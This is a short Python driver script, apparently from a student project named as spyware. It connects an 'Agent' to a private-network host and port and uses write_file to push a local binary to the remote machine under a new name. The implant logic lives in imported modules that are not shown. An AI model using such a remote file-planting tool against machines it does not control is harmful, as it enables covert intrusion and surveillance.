from connection import Connection
from agent import Agent
from command import Command
from responce import Responce
from funCode import FunCode

HOST = "192.168.83.130"
PORT = 65432


def main():
    agent = Agent(HOST, PORT)
    print(
        agent.write_file(
            "/home/avner/Arazim-Projects-2024---spyware/src/ServerSpy/testBinSend.o",
            "1212.o",
        )
    )


if __name__ == "__main__":
    main()
